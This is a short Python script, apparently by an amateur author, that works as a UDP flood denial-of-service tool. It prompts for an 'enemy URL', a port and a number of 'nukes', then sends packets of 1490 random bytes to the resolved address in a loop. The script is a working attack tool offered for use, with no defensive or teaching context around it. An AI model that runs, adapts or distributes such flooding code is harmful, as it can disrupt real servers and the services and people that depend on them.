import requests
import os
import socket
import random
from urllib.parse import urlparse

print("""
**********************
*     X_X            *
* Made by Mystic-poop*
*         Or         *
*       Xenz         *
*                    *
***********************
""")
print("Write your enemy URL (with http:// or https://)")
url = input()
parsed_url = urlparse(url)
gonnacooked = parsed_url.hostname  
print("Which port do you want to attack?")
whichport = int(input())  
print("How many nukes to send?")
amountofnukes = int(input())  
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear" if os.name == "posix" else "cls")

nukes = 0
try:
    ip = socket.gethostbyname(gonnacooked)  
except socket.gaierror:
    print("Invalid hostname. Could not resolve IP.")
    exit()

target = (ip, whichport)
print(f"Starting attack on {target[0]}:{target[1]}")

while nukes < amountofnukes:
    sock.sendto(bytes, target)
    nukes += 1
    print(f"Nuking the server... Sent: {nukes} By mystic-poop or xenz")

print("Done!")
input("Press Enter to exit")
